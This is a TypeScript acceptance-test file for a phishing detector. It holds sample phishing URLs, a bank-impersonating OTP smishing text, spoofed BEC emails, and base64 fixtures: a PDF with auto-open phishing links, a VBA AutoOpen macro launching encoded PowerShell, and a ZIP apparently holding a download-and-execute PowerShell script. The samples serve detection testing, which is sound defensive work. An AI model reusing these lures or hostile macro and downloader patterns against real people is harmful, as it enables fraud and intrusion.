import { AcceptanceTestCase } from '../types/phishguard';

/**
 * Real ZIP archive containing invoice_details.txt and verify_invoice.ps1 (DownloadString + Invoke-Expression) for Test Case #11.
 */
export function createMaliciousZipSampleBase64(): string {
  return 'UEsDBBQAAAgIAFFXal3PNTerPAAAAEEAAAATAAAAaW52b2ljZV9kZXRhaWxzLnR4dAXBgQmAMAwEwFV+AmdxhRC/9EEaSdOK23t33rRJ5BqoTliVeeeFzVSTWykGpqeeQgW2+OKLldDYIefxA1BLAwQUAAAICABRV2pduGfvlZEAAACoAAAAEgAAAHZlcmlmeV9pbnZvaWNlLnBzMTWOsQ6CMBRFd77iBRl04EGJJMaESR1ccCDRudQHVrFt2heRvzcYXU/uuTkLOJqX1YrgTF53WknW1kCjvHYcJWrQZBgqqGlMT+2dFEMzBaYn1sR4oXb3XUSJk9Ng5RUq+Em4t6OZUcNem34Z35jdNsvEpsSiyFHkAtdlFlj2VKALIl5Fc8uD0sPbeQphDvn/fgBQSwECFAMUAAAICABRV2pdzzU3qzwAAABBAAAAEwAAAAAAAAAAAAAApIEAAAAAaW52b2ljZV9kZXRhaWxzLnR4dFBLAQIUAxQAAAgIAFFXal24Z++VkQAAAKgAAAASAAAAAAAAAAAAAACkgW0AAAB2ZXJpZnlfaW52b2ljZS5wczFQSwUGAAAAAAIAAgCBAAAALgEAAAAA';
}

/**
 * Real PDF file buffer containing a suspicious external phishing URI and /OpenAction for Test Case #9.
 */
export function createSuspiciousPdfSampleBase64(): string {
  return 'JVBERi0xLjcKMSAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZyAvUGFnZXMgMiAwIFIgL09wZW5BY3Rpb24gPDwgL1MgL1VSSSAvVVJJIChodHRwOi8vYWxyYWpoaS1sb2dpbi12ZXJpZnktdXBkYXRlLmNvbS9hdXRoL2xvZ2luKSA+PiA+PgplbmRvYmoKMiAwIG9iago8PCAvVHlwZSAvUGFnZXMgL0tpZHMgWzMgMCBSXSAvQ291bnQgMSA+PgplbmRvYmoKMyAwIG9iago8PCAvUGFnZSAvUGFyZW50IDIgMCBSIC9NZWRpYUJveCBbMCAwIDYxMiA3OTJdIC9Bbm5vdHMgWzQgMCBSXSA+PgplbmRvYmoKNCAwIG9iago8PCAvVHlwZSAvQW5ub3QgL1N1YnR5cGUgL0xpbmsgL1JlY3QgWzEwMCA1MDAgMzAwIDU1MF0gL0EgPDwgL1MgL1VSSSAvVVJJIChodHRwOi8vcGF5cGExLXNlY3VyaXR5LWNvbmZpcm0uY29tL3NpZ25pbikgPj4gPj4KZW5kb2JqCnRyYWlsZXIKPDwgL1Jvb3QgMSAwIFIgPj4KJSVFT0Y=';
}

/**
 * Real Office OLE2 / VBA Macro document buffer for Test Case #10.
 */
export function createOfficeMacroSampleBase64(): string {
  return '0M8R4KGxGuEKQXR0cmlidXRlIFZCX05hbWUgPSAiTmV3TWFjcm9zIgpTdWIgQXV0b09wZW4oKQogIERpbSBzaCBBcyBPYmplY3QKICBTZXQgc2ggPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQogIHNoLlJ1biAicG93ZXJzaGVsbC5leGUgLUVuY29kZWRDb21tYW5kIFV3QjBBR0VBY2dCMEFDMEFVQUJ5QUc4QVl3QmxBSE1BY3dBPSIsIDAKRW5kIFN1Ygo=';
}

/**
 * Unsupported proprietary binary buffer for Test Case #13.
 */
export function createUnsupportedBinarySampleBase64(): string {
  return 'mYh3ABM3wN4A/0IZAQIDBA==';
}

export const MANDATORY_ACCEPTANCE_TESTS: AcceptanceTestCase[] = [
  {
    id: 'tc-01-legit-url',
    number: 1,
    titleAr: '1. رابط شرعي يعمل (Legitimate Working URL)',
    titleEn: '1. Legitimate Working URL',
    sampleType: 'URL',
    expectedClassification: ['SAFE'],
    expectedLinkStatus: ['WORKING', 'REDIRECTED'],
    descriptionAr: 'فحص نطاق رسمي موثوق يعمل ببروتوكول HTTPS وشهادة صالحة دون مؤشرات انتحال.',
    payload: {
      url: 'https://www.google.com',
    },
  },
  {
    id: 'tc-02-bank-phish-url',
    number: 2,
    titleAr: '2. رابط تصيد يحاكي نطاق بنك (Bank Domain Typosquatting)',
    titleEn: '2. Phishing URL Mimicking Bank Domain',
    sampleType: 'URL',
    expectedClassification: ['PHISHING'],
    descriptionAr: 'نطاق منتحل يحاكي مصرف الراجحي عبر استبدال الحروف وإضافة كلمات استدراج.',
    payload: {
      url: 'https://alrajh1-bank-verify-login.com/auth/signin',
    },
  },
  {
    id: 'tc-03-unicode-homoglyph-url',
    number: 3,
    titleAr: '3. رابط يحتوي على أحرف Unicode متشابهة (Homoglyph / IDN Attack)',
    titleEn: '3. URL with Unicode Homoglyph Characters',
    sampleType: 'URL',
    expectedClassification: ['PHISHING', 'SUSPICIOUS'],
    descriptionAr: 'استخدام حرف الـ "а" السيريلي (U+0430) بدلاً من اللاتيني لخداع المستخدم بصرياً.',
    payload: {
      url: 'https://pаypal.com/signin/verify',
    },
  },
  {
    id: 'tc-04-shortener-redirect',
    number: 4,
    titleAr: '4. رابط مختصر يعيد التوجيه لنطاق مشبوه (Shortener -> Phishing Redirect)',
    titleEn: '4. Shortened URL Redirecting to Suspicious Domain',
    sampleType: 'URL',
    expectedClassification: ['PHISHING', 'SUSPICIOUS'],
    expectedLinkStatus: ['REDIRECTED'],
    descriptionAr: 'رابط مختصر عبر bit.ly يقود بعد تتبع سلسلة التوجيه إلى صفحة تصيد تنتحل Microsoft.',
    payload: {
      url: 'https://bit.ly/3xYzSecLogin',
      simulateRedirectTo: 'https://m1crosoft-account-security-verify.xyz/login',
    },
  },
  {
    id: 'tc-05-unreachable-url',
    number: 5,
    titleAr: '5. رابط لا يمكن الوصول إليه (Unreachable URL)',
    titleEn: '5. Unreachable Domain URL',
    sampleType: 'URL',
    expectedClassification: ['UNKNOWN'],
    expectedLinkStatus: ['UNREACHABLE'],
    descriptionAr: 'نطاق غير موجود في DNS للتأكد من فصل حالة عمل الرابط (UNREACHABLE) عن التصنيف الأمني (UNKNOWN).',
    payload: {
      url: 'https://nonexistent-domain-998877665544.invalid/portal',
      simulateUnreachable: true,
    },
  },
  {
    id: 'tc-06-otp-message',
    number: 6,
    titleAr: '6. رسالة نصية تطلب رمز التحقق OTP (OTP Smishing Message)',
    titleEn: '6. SMS Requesting OTP Verification Code',
    sampleType: 'MESSAGE',
    expectedClassification: ['PHISHING'],
    descriptionAr: 'رسالة تنتحل صفة بنك وتستخدم التخويف بتجميد الحساب لطلب مشاركة رمز OTP.',
    payload: {
      message:
        'تنبيه عاجل من مصرف الراجحي: تم رصد حركة غير معتادة على بطاقتك المصرفية وسيتم إيقاف حسابك خلال ساعة. لتفادي التجميد يرجى تزويدنا برمز التحقق OTP المرسل لجوالك أو الدخول فوراً: https://alrajhi-verify-otp.com',
    },
  },
  {
    id: 'tc-07-email-reply-to-mismatch',
    number: 7,
    titleAr: '7. بريد إلكتروني باختلاف بين From و Reply-To (BEC / Reply-To Mismatch)',
    titleEn: '7. Email with From vs Reply-To Mismatch',
    sampleType: 'EMAIL',
    expectedClassification: ['PHISHING', 'SUSPICIOUS'],
    descriptionAr: 'بريد يظهر كأنه من الإدارة المالية بينما يوجه الردود في Reply-To إلى نطاق خارجي لطلب تحويل بنكي.',
    payload: {
      emailRaw: [
        'From: "Financial Controller" <finance@company-corp.sa>',
        'Reply-To: urgent-transfer-ceo@external-fraud-mail.xyz',
        'Return-Path: <bounce@external-fraud-mail.xyz>',
        'Subject: عاجل: تحويل مبلغ مستحق للمورد الجديد اليوم',
        'Authentication-Results: mx.google.com; spf=softfail; dkim=none; dmarc=none',
        '',
        'السلام عليكم، يرجى سداد رسوم الفاتورة المرفقة وتحويل مبلغ 45,000 ريال فوراً إلى رقم الآيبان الجديد وعدم إخبار أحد حتى اكتمال التسوية.',
      ].join('\n'),
    },
  },
  {
    id: 'tc-08-email-dmarc-fail',
    number: 8,
    titleAr: '8. بريد إلكتروني يفشل في مصادقة DMARC (DMARC Fail Spoofing)',
    titleEn: '8. Email Failing DMARC Authentication',
    sampleType: 'EMAIL',
    expectedClassification: ['PHISHING'],
    descriptionAr: 'بريد منتحل لنطاق رسمي مع فشل صريح في SPF و DKIM و DMARC ورابط مضلل.',
    payload: {
      emailRaw: [
        'From: "PayPal Security" <security@paypal.com>',
        'Reply-To: support@paypa1-security-alert.com',
        'Return-Path: <mailer@untrusted-vps-host.ru>',
        'Subject: Urgent action required: Your account has been suspended',
        'Authentication-Results: mx.google.com; spf=fail (google.com: domain of security@paypal.com does not designate 185.220.101.9 as permitted sender); dkim=fail; dmarc=fail (p=REJECT sp=REJECT dis=REJECT)',
        '',
        '<html><body>Dear customer, please verify your identity within 24 hours: <a href="http://paypa1-account-verify.ru/login">https://www.paypal.com/signin</a></body></html>',
      ].join('\n'),
    },
  },
  {
    id: 'tc-09-pdf-suspicious-links',
    number: 9,
    titleAr: '9. ملف PDF يحتوي على روابط خارجية مشبوهة (PDF with Phishing URI)',
    titleEn: '9. PDF File with Suspicious External Links',
    sampleType: 'FILE',
    expectedClassification: ['PHISHING', 'SUSPICIOUS', 'MALICIOUS'],
    descriptionAr: 'ملف PDF يحتوي على إجراء فتح تلقائي (/OpenAction) وروابط /URI توجه إلى صفحات تصيد مصرفي.',
    payload: {
      fileName: 'bank_statement_urgent.pdf',
      fileMimeType: 'application/pdf',
      fileContentBase64: createSuspiciousPdfSampleBase64(),
    },
  },
  {
    id: 'tc-10-office-macro',
    number: 10,
    titleAr: '10. ملف Office يحتوي على وحدات ماكرو (Office Document with AutoOpen Macro)',
    titleEn: '10. Office Document Containing VBA Macros',
    sampleType: 'FILE',
    expectedClassification: ['MALICIOUS'],
    descriptionAr: 'مستند Word يحتوي على ماكرو VBA (AutoOpen) يستدعي WScript.Shell وأمر PowerShell مشفر.',
    payload: {
      fileName: 'purchase_order_2026.docm',
      fileMimeType: 'application/vnd.ms-word.document.macroEnabled.12',
      fileContentBase64: createOfficeMacroSampleBase64(),
    },
  },
  {
    id: 'tc-11-zip-suspicious-script',
    number: 11,
    titleAr: '11. ملف مضغوط ZIP بداخله سكربت مشبوه (ZIP Archive with Malicious Script)',
    titleEn: '11. Compressed ZIP Containing Suspicious Script',
    sampleType: 'FILE',
    expectedClassification: ['MALICIOUS'],
    descriptionAr: 'أرشيف ZIP يحتوي بداخله على سكربت PowerShell يقوم بتحميل وتنفيذ شيفرة عن بعد (DownloadString + Invoke-Expression).',
    payload: {
      fileName: 'shipment_documents.zip',
      fileMimeType: 'application/zip',
      fileContentBase64: createMaliciousZipSampleBase64(),
    },
  },
  {
    id: 'tc-12-qr-phishing-image',
    number: 12,
    titleAr: '12. صورة تحتوي على رمز QR يؤدي لصفحة تصيد (Quishing / QR Phishing)',
    titleEn: '12. Image with QR Code Leading to Phishing Page',
    sampleType: 'IMAGE',
    expectedClassification: ['PHISHING'],
    descriptionAr: 'صورة تحتوي على رمز QR مضمّن يوجه المستخدم إلى نطاق تصيد ينتحل منصة أبشر/البنك لسرقة بيانات الدخول.',
    payload: {
      fileName: 'qr_security_update_notice.png',
      imageDescription: 'إشعار أمني يطلب مسح رمز الاستجابة السريعة QR لتحديث بيانات الحساب البنكي وتفادي إيقاف البطاقة.',
      qrPayload: 'https://absh3r-gov-verify-login.com/otp-confirm',
    },
  },
  {
    id: 'tc-13-unsupported-file',
    number: 13,
    titleAr: '13. ملف ثنائي غير مدعوم تحليله (Unsupported File Format -> UNKNOWN)',
    titleEn: '13. Unsupported File Format (Must Return UNKNOWN, Never SAFE)',
    sampleType: 'FILE',
    expectedClassification: ['UNKNOWN'],
    descriptionAr: 'ملف بتنسيق ثنائي خاص غير مدعوم (.qbin)؛ يجب أن تكون النتيجة UNKNOWN (لم يتمكن النظام من فحص نوع الملف) وليس SAFE.',
    payload: {
      fileName: 'proprietary_firmware_dump.qbin',
      fileMimeType: 'application/octet-stream',
      fileContentBase64: createUnsupportedBinarySampleBase64(),
    },
  },
];
